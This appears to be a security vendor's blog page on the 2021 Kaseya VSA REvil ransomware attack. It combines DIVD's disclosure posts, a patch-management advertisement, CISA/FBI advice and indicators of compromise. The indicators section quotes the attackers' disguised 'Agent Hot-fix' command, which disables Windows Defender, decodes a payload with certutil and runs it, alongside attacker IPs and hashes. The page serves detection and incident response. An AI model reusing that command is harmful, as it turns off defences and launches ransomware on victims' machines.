# Kaseya VSA Limited Disclosure

07 Jul 2021 -
[Frank Breedijk](https://www.divd.nl/who-we-are/team/people/frank-breedijk/)

## Why we are only disclosing limited details on the Kaseya vulnerabilities

Last weekend we found ourselves in the middle of a storm. A storm created by the ransomware attacks executed via Kaseya VSA, using a vulnerability which we confidentially disclosed to Kaseya, together with six other vulnerabilities.

Ever since we released the news that we indeed notified Kaseya of a vulnerability used in the ransomware attack, we have been getting requests to release details about these vulnerabilities and the disclosure timeline. In line with the guidelines for [Coordinated Vulnerability Disclosure](https://english.ncsc.nl/publications/publications/2019/juni/01/coordinated-vulnerability-disclosure-the-guideline) we have not disclosed any details so far. And, while we feel it is time to be more open about this process and our decisions regarding this matter, we will still not release the full details.

## Why the secrecy?

As the ransomware attack using Kaseya VSA software has shown, the effects of a malicious actor knowing the full details of a vulnerability can be devastating. This immediately poses a dilemma to anybody that discovers a critical vulnerability in a critical piece of software, do we disclose the details or not?

Letâs use an analogy. Say a security researcher discovers a vulnerability in a high-end car. When you kick the left rear bumper in just the right way, the car doors open, and the engine starts. What should the researcher do? Tell everybody, tell all the owners of this type of car, or inform the manufacturer so he can recall and fix the car?

If the full details are made public, it is evident that many cars will get stolen very soon. If you inform the owners, this will likely happen too. The chances of the details remaining secret are slim if you inform a broad audience. Even if you limit the details to âa security issue involving the bumperâ, you might tip off the wrong people. Telling the manufacturer there is a good chance that he comes up with a fix before large-scale car thefts are happening, and consider if you need to tell the owners to keep their car behind closed doors in the meantime.

## How does this relate to Kaseya VSA?

When we discovered the vulnerabilities in early April, it was evident to us that we could not let these vulnerabilities fall into the wrong hands. After some deliberation, we decided that informing the vendor and awaiting the delivery of a patch was the right thing to do. We hypothesized that, in the wrong hands, these vulnerabilities could lead to the compromise of large numbers of computers managed by Kaseya VSA.

As we stated before, Kaseyaâs response to our disclosure has been on point and timely; unlike other vendors, we have previously disclosed vulnerabilities to. They listened to our findings, and addressed some of them by releasing a [patch](https://helpdesk.kaseya.com/hc/en-gb/articles/360019054377-9-5-5-Feature-Release-10-April-2021) resolving a number of these vulnerabilities. Followed by a [second patch](https://helpdesk.kaseya.com/hc/en-gb/articles/360019966738-9-5-6-Feature-Release-8-May-2021) resolving even more. Weâve been in contact with Kaseya ahead of the release of both these patches, allowing us to validate that these vulnerabilities had indeed been resolved by the patch in development.

Unfortunately, the worst-case scenario came true on Friday the 2nd of July. Kaseya VSA was used in an attack to spread ransomware, and Kaseya was compelled to use the nuclear option: shutting down their Kaseya Cloud and advising customers to turn off their on-premise Kaseya VSA servers. A message that unfortunately arrived too late for some of their customers.

We later learned that one of the two vulnerabilities used in the attack was one we previously disclosed to Kasya VSA.

## What can we tell?

In this blogpost and DIVD case [DIVD-2021-00011](https://csirt.divd.nl/DIVD-2021-00011/) we publish the timeline and limited details of the vulnerabilities we notified Kaseya of.

## Full disclosure?

Given the serious nature of these vulnerabilities and the obvious consequences of abuse of Kaseya VSA we will not disclose the full details of the vulnerabilities until such time that Kaseya has released a patch and this patch has been installed on a sufficient number of systems, something for which we have the monitoring scripts. In the past few days we have been working with Kaseya to make sure customers turn off their systems, by tipping them off about customers that still have systems online, and hope to be able to continue to work together to ensure that their patch is installed everywhere. We have no indication that Kaseya is hesitant to release a patch. Instead they are still working hard to make sure that after their patch the system is as secure as possible, to avoid a repeat of this scenario. Therefore we do not feel the need to lay down any kind of deadline for full disclosure at this point in time. A properly patched and secure Kaseya VSA is in the best interest of security of Kaseya customers and the internet at large.

## The vulnerabilities

We notified Kaseya of the following vulnerabilities:

* [CVE-2021-30116](https://csirt.divd.nl/cves/CVE-2021-30116) - A credentials leak and business logic flaw, resolution in progress.
* [CVE-2021-30117](https://csirt.divd.nl/cves/CVE-2021-30117) - An SQL injection vulnerability, resolved in May 8th patch.

* [CVE-2021-30119](https://csirt.divd.nl/cves/CVE-2021-30119) - A Cross Site Scripting vulnerability, resolution in progress.
* [CVE-2021-30120](https://csirt.divd.nl/cves/CVE-2021-30120) - 2FA bypass, resolution in progress.
* [CVE-2021-30121](https://csirt.divd.nl/cves/CVE-2021-30121) - A Local File Inclusion vulnerability, resolved in May 8th patch.
* [CVE-2021-30201](https://csirt.divd.nl/cves/CVE-2021-30201) - A XML External Entity vulnerability, resolved in May 8th patch.

### Take Patch Management Miles Ahead with the Industry Leading Patching Capabilities

 Automate Patching for Faster Deployment

Manual patching cycles are tedious and time-consuming. With the SanerNow automated patch management tool, configure end-to-end workflows for automatic patching and fix risks faster than ever. Schedule automated patching tasks and make patching a hands-free task. It also supports the upload of pre and post-remediation scripts.

 Test and Approve Patches for Zero-Disruption

Applying new patches directly to the production environment is risky. SanerNow patch management software enables you to create a test environment to test the new patches to verify compatibility. Later, deploy the approved patches across the devices in your production environment and prevent any disruptions and productivity errors.

 Perimeter-Less Patching with a Single, light-weight Agent

SanerNow auto patching software is an ideal solution for hybrid workforces. You can easily deploy patches across globally distributed devices from a centralized cloud patch management solution. Furthermore, all the patching tasks, from scanning to deployment, are executed by a single lightweight multifunctional agent installed in the endpoints. You can also go for the agent-less option, which is a unique approach to scanning while retaining the scan speed and accuracy.

 Risk based Prioritization to Deploy Patches Smartly

SanerNow auto patching tool thoroughly assesses the patches and prioritizes them based on their business context, technical impact, severity level, and more intelligence to help focus on critical patches immediately. Additionally, you can deploy these patches quickly to reduce risk exposure and plan your remediation efforts wisely.

 Firmware Patches for Complete Risk Mitigation

As important as the software application patches, firmware patches are critical to tightening IT security. Moreover, it is recommended to include firmware patching as you establish your automated patch management cadence to reduce security risk exposure. SanerNow patch manager supports patching for firmware updates to fix issues and errors in firmware.

 Continuous and Customizable Patch Scans to Identify Missing Patches

Move away from the periodic scans and make it a continuous process with SanerNow patch management software. Keep your patching up-to-date with customized, real-time, and continuous scans for verified patches based on your IT environment. You can additionally perform real-time, on-demand, scheduled, and automated patch scans with the SanerNow patch management tool.

 Cross-Platform Patching with Support for Third-Party Apps

SanerNow patch management tool supports multi-platform patching for all major operating systems like Windows, macOS, Linux, and 550+ third-party applications. SanerNow’s automated patching solution additionally maintains a pre-built patch repository for third-party application patches.

 Effortless Patch Rollback for an Error-Prone Patching

Patch rollback is made easier with the SanerNow automated patch management tool to avoid disruptions in business operations. It rollbacks the last stable version with zero downtime and a single click to easily deal with incompatible and error-prone software patches.

 Comply with Industry Benchmarks and Security Standards

Various industry regulatory standards and organizations mandate patch compliance. SanerNow auto patch management software provides a unified view of your software patch compliance to address deviations from compliance standards and deploy patches accordingly. However, with auto patching in SanerNow, you can quickly fix the misconfigurations and achieve compliance with regulatory standards.

 Insights and Tracking with Reports and Audit Logs

Track detailed insights on your patching metrics with auto-generated reports and an inbuilt audit log. SanerNow automated patch management software provides a wide range of reports to assess the patching status in your network. Additionally, SanerNow provides an insightful Patch Impact Report to analyze the impact of patches and track the patching activities.

![](https://www.secpod.com/wp-content/uploads/2024/06/Asset-12@4x-8-1024x954-3.webp)

*“SanerNow’s patch management capabilities stand out from the competition since it can patch all the discovered vulnerabilities and perform other system-hardening actions. Even if no direct remediation is available, SanerNow applies security controls that provide workarounds for the* *vulnerabilities.”*

**– Swetha Krishnamoorthi, Senior Industry Analyst, Cybersecurity, Frost & Sullivan**

# Kaseya Case Update 2

04 Jul 2021 -
[Victor Gevers](https://www.divd.nl/who-we-are/team/people/victor-gevers/)

During the last 48 hours, the number of Kaseya VSA instances that are reachable from the internet has dropped from over 2.200 to less than 140 in our last scan today. And, by working closely with our trusted partners and national CERTs, the number of servers in The Netherlands has dropped to zero. A good demonstration of how a cooperative network of security-minded organizations can be very effective during a nasty crisis.

By now, it is time to be a bit more clear on our role in this incident. First things first, yes, Wietse Boonstra, a DIVD researcher, has previously identified a number of the zero-day vulnerabilities [CVE-2021-30116] which are currently being used in the ransomware attacks. And yes, we have reported these vulnerabilities to Kaseya under responsible disclosure guidelines (aka coordinated vulnerability disclosure).

Our research into these vulnerabilities is part of a larger project in which we investigate vulnerabilities in tools for system administration, specifically the administrative interfaces of these applications.

These are products like [Vembu BDR](https://csirt.divd.nl/cases/DIVD-2020-00011/), [Pulse VPN](https://csirt.divd.nl/cases/DIVD-2021-00005/), [Fortinet VPN](https://csirt.divd.nl/cases/DIVD-2020-00012/), to name a few. We are focusing on these types of products because we spotted a trend where more and more of the products that are used to keep networks safe and secure are showing structural weaknesses.

After this crisis, there will be the question of who is to blame. From our side, we would like to mention Kaseya has been very cooperative. Once Kaseya was aware of our reported vulnerabilities, we have been in constant contact and cooperation with them. When items in our report were unclear, they asked the right questions. Also, partial patches were shared with us to validate their effectiveness. During the entire process, Kaseya has shown that they were willing to put in the maximum effort and initiative into this case both to get this issue fixed and their customers patched. They showed a genuine commitment to do the right thing. Unfortunately, we were beaten by REvil in the final sprint, as they could exploit the vulnerabilities before customers could even patch.

After the first reports of ransomware occurred, we kept working with Kaseya, giving our input on what happened and helping them cope with it. This included giving them lists of IP addresses and customer IDs of customers that had not responded yet, which they promptly contacted by phone.

So, in summary: DIVD has been in a Coordinated Vulnerability Disclosure process with Kaseya, who was working on a patch. Some of these vulnerabilities were used in this attack. Kaseya and DIVD collaborated to limit the damage wherever possible.

As more details become available, we will report them on our [blog](https://csirt.divd.nl/blog/) and [case file](https://csirt.divd.nl/DIVD-2021-00002/).

[Kaseya](https://www.kaseya.com/) is a US-based organization that provides IT and security management solutions for managed service providers (MSPs) and small to medium-sized businesses (SMBs) worldwide. One of its tools, called Kaseya’s VSA, is under active exploitation and used as an attack vector to install [**REvil** **ransomware**](https://en.wikipedia.org/wiki/REvil) worldwide. A [vulnerability management tool](https://www.secpod.com/vulnerability-management/) can help mitigate this vulnerability. Kaseya VSA (Virtual System/Server Administrator) is software that provides a centralized console to monitor and manage endpoints, automate IT processes, deploy security patches, and control access. It is available either as a hosted cloud service or via on-premises VSA servers.

On July 2nd, when the Kaseya was in the process of fixing various **zero-day** vulnerabilities reported privately to it, **REvil** ransomware operators started exploiting the **zero-day** vulnerabilities to deploy ransomware. Many companies whose networks managed using Kaseya Virtual System Administrator (VSA) became the victims of this large-scale ransomware attack. This attack sffects more than 1500 businesses worldwide. The REvil ransomware group, however, claims to have encrypted over **1,000,000** systems worldwide in this attack. Researchers at [the Dutch Institute for Vulnerability Disclosure (DIVD)](https://csirt.divd.nl/cases/DIVD-2021-00002/), who reported many zero-day vulnerabilities believe that the vulnerability identified with [**CVE-2021-30116**](https://www.scaprepo.com/view.jsp?id=CVE-2021-30116) is used in these ransomware attacks. Though, they have not provided any further details about the other vulnerabilities. A [patch management software](https://www.secpod.com/patch-management/) can be used to overcome this.

## Kaseya VSA REvil Ransomware

**REvil (Ransomware Evil),** also known as **Sodinokibi,** operates as ransomware-as-a-service (RaaS), meaning anyone can buy the service and use the ransomware payload and infrastructure to manage the victim communications distribution of decryption tools. REvil ransomware operators prefer to recruit affiliates to distribute the ransomware instead of attacking companies directly and split the revenue generated from ransom payments. Like many other ransomware families, REvil maintains a website where they publish details of their latest victims and the files collected from them. On their website page called ‘**Happy Blog**,’ REvil has confirmed that they were behind the attack against Kaseya and has demanded a ransom of **70 million dollars** to decrypt files on all organizations affected by this attack.

[![Kaseya-VSA-Attack-Info](https://www.secpod.com/blog/wp-content/uploads/2021/07/Kaseya_note.jpg)](https://www.secpod.com/blog/wp-content/uploads/2021/07/Kaseya_note.jpg)

As per [one researcher](https://twitter.com/jackhcable/status/1411906687968161792), the REvil gang has now lowered its demand from 70 million dollars to **50 million dollars**. REvil ransomware uses the **Salsa20** symmetric stream algorithm for encryption of data and **elliptic curve** asymmetric algorithm for encrypting the keys. The decryption of files affected by REvil is impossible without the operator’s keys.

## CISA and FBI Advice on Kaseya VSA attack

US Cybersecurity and Infrastructure Security Agency (CISA) and Federal Bureau of Investigation (FBI) have shared advisory for managed service providers (MSPs) and their customers impacted by this REvil ransomware attack. The MSPs affected by the attack are advised to check their systems for signs of compromise using Kaseya’s detection tool and enable multi-factor authentication (MFA) on as many accounts as possible. MSPs should also implement allowlists to limit access to their internal assets and protect their remote monitoring tools’ admin interface using firewalls or VPNs. The complete list is below.

* Download the **[Kaseya VSA Detection Tool](https://kaseya.app.box.com/s/0ysvgss7w48nxh8k1xt7fqhbcjxhas40)**
* This tool analyzes a system (either VSA server or managed endpoint) and determines whether any compromise (IOCs) indicators are present.
* Enable and enforce multi-factor authentication (MFA) on every single account under the organization’s control, and—to the maximum extent possible—enable and enforce MFA for customer-facing services.
* Implement allow the listing to limit communication with remote monitoring and management (RMM) capabilities to known IP address pairs and/or
* Place administrative interfaces of RMM behind a virtual private network (VPN) or a firewall on a dedicated administrative network.

**CISA and the FBI also advise affected MSP customers to:**

* Ensure backups are up to date and stored in an easily retrievable location air-gapped from the organizational network.
* Revert to a manual patch management process that follows vendor remediation guidance, including installing new patches as soon as they become available.
* Implement MFA and principle of least privilege on key network resources admin accounts.

## Indicators of Compromise

Security researchers at Huntress Labs have provided [details](https://www.reddit.com/r/msp/comments/ocggbv/crticial_ransomware_incident_in_progress/) on initial indicators of compromise for this attack.

**Kaseya VSA Servers details of intrusion** include:

* Attackers uploaded `agent.crt` and `Screenshot.jpg` to exploited VSA servers, and this [activity can be found](https://imgur.com/a/AxzM3yI) in `KUpload.log` (which \*may\* be wiped by the attackers or encrypted by ransomware if a VSA agent was also installed on the VSA server).
* A series of GET and POST requests using curl can be found [within the KaseyaEdgeServices logs](https://i.imgur.com/qgr3zpH.png) located in `%ProgramData%\Kaseya\Log\KaseyaEdgeServices` directory with a file name following this modified ISO8601 naming scheme `KaseyaEdgeServices-YYYY-MM-DDTHH-MM-SSZ.log`.
* Attackers came from the following IP addresses using the user agent `curl/7.69.1`:

  `18.223.199[.]234` (Amazon Web Services)

  `161.35.239[.]148` (Digital Ocean)

  `35.226.94[.]113` (Google Cloud)

  `162.253.124[.]162` (Sapioterra)
* The VSA procedure used to deploy the encrypto named “Kaseya VSA Agent Hot-fix.” An additional procedure named “Archive and Purge Logs” runs to clean up after themselves ([screenshot here](https://i.imgur.com/ZPGWbos.png))
* The “Kaseya VSA Agent Hot-fix” procedure ran the following: `"C:\WINDOWS\system32\cmd.exe"

  /c ping 127.0.0.1 -n 4979 > nul &

  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

  Set-MpPreference -DisableRealtimeMonitoring $true

  c:\kworking\agent.crt c:\kworking\agent.exe & del /q /f

  c:\kworking\agent.crt C:\Windows\cert.exe & c:\kworking\agent.exe`

**Kaseya VSA agent details of intrusion include:**

* Ransomware encryptors pushed via the Kaseya VSA agent were dropped in `TempPath` with the file name `agent.crt` and decoded to `agent.exe`. `TempPath` resolves to `c:\kworking\agent.exe` by default and is configurable within `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Kaseya\Agent\<unique id>`
* When `agent.exe` runs, the legitimate Windows Defender executable `MsMpEng.exe` and the encryptor payload `mpsvc.dll` are [dropped into the hardcoded path](https://i.imgur.com/lrcUNOD.png) “c:\Windows” to perform DLL sideloading.
* The `mpsvc.dll` Sodinokibi DLL creates the registry key `HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\BlackLivesMatter` which [contains several registry values](https://i.imgur.com/fJedI5l.png) that store encryptor runtime keys/configurations artifacts.
* agent.crt – MD5: [939aae3cc456de8964cb182c75a5f8cc](https://gist.github.com/KyleHanslovan/1dabd9ad42b8b8148bd2c02b86c04bcf) – Encoded malicious content
* agent.exe – MD5: [561cffbaba71a6e8cc1cdceda990ead4](https://www.virustotal.com/gui/file/d55f983c994caa160ec63a59f6b4250fe67fb3e8c43a388aec60a4a6978e9f1e/detection) – Decoded contents of agent.crt
* cert.exe – MD5: <random due to appended string> – Legitimate Windows certutil.exe utility
* mpsvc.dll – MD5: [a47cf00aedf769d60d58bfe00c0b5421](https://www.virustotal.com/gui/file/8dd620d9aeb35960bb766458c8890ede987c33d239cf730f93fe49d90ae759dd/detection)– REvil encryptor payload

## Affected Applications

All versions of On-Premises Virtual System/Server Administrator (VSA)

---

## Global impact

This has been the largest ransomware attack on record, affecting close to 1500 of Kaseya’s clients spread across 17 countries. The full impact of the attack still analyses cybersecurity professionals globally.

Huntress Labs has [closely monitoring this situation as it unfolds](https://www.huntress.com/blog/rapid-response-kaseya-vsa-mass-msp-ransomware-incident), reported that 30 MSPs affected, consequently affecting 1000s of dependent businesses.

Some events as per news reports:

* One of the most significant impacts were when 800 stores of Swedish supermarket chain Coop closed after their cash registers disabled during the attack. Swedish state railway services and a prominent pharmacy chain affected varying degrees by the attack.
* 100 kindergartens in New Zealand had their computers disabled, furthermore 9 schools have also affected in some manner.

As per Kaseya’s [status webpage](https://status.kaseya.net/):

> “All VSA SaaS servers will be put into maintenance mode. We apologize for any inconvenience. – Kaseya Cloud Operations Team”

---

## Solution
